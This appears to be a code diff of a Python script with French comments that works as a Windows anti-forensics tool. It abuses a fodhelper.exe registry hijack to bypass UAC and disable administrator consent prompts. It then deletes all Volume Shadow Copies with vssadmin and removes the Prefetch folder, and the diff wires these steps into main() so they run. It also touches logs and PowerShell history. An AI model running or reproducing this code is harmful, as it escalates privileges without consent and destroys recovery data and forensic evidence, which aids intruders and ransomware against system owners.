@@ -3,6 +3,7 @@ import time
 import sys
 import re
 import pyfiglet
+import subprocess
 """
 A faire : 
 Delete le prefetch
@@ -34,16 +35,15 @@ print(file[-len_path_file:])
 #print(file[-len_file:])
 
 
-	# La variable "cmd" etant celle passée en argument il faut la changer selon ce qu'il est demandé de faire
+
 def bypass_uac_1():
-	# La variable "cmd" etant celle passée en argument il faut la changer selon ce qu'il est demandé de faire
 	cmd = f"C:\Windows\System32\cmd.exe /k powershell.exe Set-Itemproperty -path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'ConsentPromptBehaviorAdmin' -value '0'"
 	try:
-		#Ajouter une possibilité pour changer une clé de registre
 		os.system(f'reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d "{cmd}" /f')
 		os.system('reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f')
 		os.popen('fodhelper.exe')
 		time.sleep(10)
+		os.popen("powershell \"Start-Process powershell -Verb runas 'taskkill /F /IM cmd.exe'\"")
 		os.system('reg delete "HKCU\Software\Classes\.thm\" /f')
 		os.system('reg delete "HKCU\Software\Classes\ms-settings\" /f')
 	except:
@@ -76,18 +76,19 @@ def detect_uac():
 				output_uac_value = int(output_uac_value)
 				print(output_uac_value)
 				if output_uac_value == 2:
-					bypass_uac = False
+					return False
 				elif output_uac_value == 0: 
-					bypass_uac = True
+					return True
 				else:
 					bypass_uac_1()
-					bypass_uac = True
+					return True
 
 			else:
 				print("UAC not enabled\n no need to bypass")
+				return True
 			
 		else:
-			bypass_uac = False
+			return False
 			print("Not admin :/")
 			
 	except:
@@ -96,8 +97,19 @@ def detect_uac():
 
 def delete_prefetch():
 	windows = os.environ['WINDIR'] + "\Prefetch"
-	#time.sleep(15)
+	commande = f'rm -r {windows}'
+	"""
+	commande_dir = f'ls {windows}'
+	dir_ = os.popen(f"powershell \"Start-Process powershell -Verb runas '{commande_dir}'\"")
+	output_dir = dir_.read()
+	print(output_dir)
+	"""
+	try:
+		os.popen(f"powershell \"Start-Process powershell -Verb runas '{commande}'\"")
+	except:
+		pass
 	#On attend 15 secondes le temps que le prefetch se créer.
+	"""
 	try:
 		#dir C:\Windows\Prefetch
 		#Permet de lister les prefetch
@@ -114,7 +126,7 @@ def delete_prefetch():
 		    	break
 	except OSError as e:
 		print(f"Os Error:{e}")
-
+	"""
 
 #Pour les VSS avec le cmd vssadmin List Shadows 
 # Voir https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html#:~:text=Your%20shadow%20copies%20are%20generally,folder%20(hidden%20by%20default).
@@ -126,7 +138,7 @@ def vss():
 	try:
 		volume = os.environ['SystemDrive']
 		commande = f'vssadmin delete shadows /for={volume} /all /quiet'
-		os.popen(f"powershell \"Start-Process powershell -Verb runas '{commande}'")
+		os.popen(f"powershell \"Start-Process powershell -Verb runas '{commande}'\"")
 
 	except Exception as e:
 		print(e)
@@ -150,14 +162,10 @@ def clear_logs():
 
 
 def main():
-	detect_uac()
-	os.popen("powershell \"Start-Process powershell -Verb runas 'taskkill /F /IM cmd.exe'\"")
-	if bypass_uac:
-		"""
-		clear_log()
-		delete_prefetch()
-		"""
+	if detect_uac():
+		#clear_log()
 		vss()
+		delete_prefetch()
 	powershell_history()
 	test = input("Tapes sur  Enter ...")
 
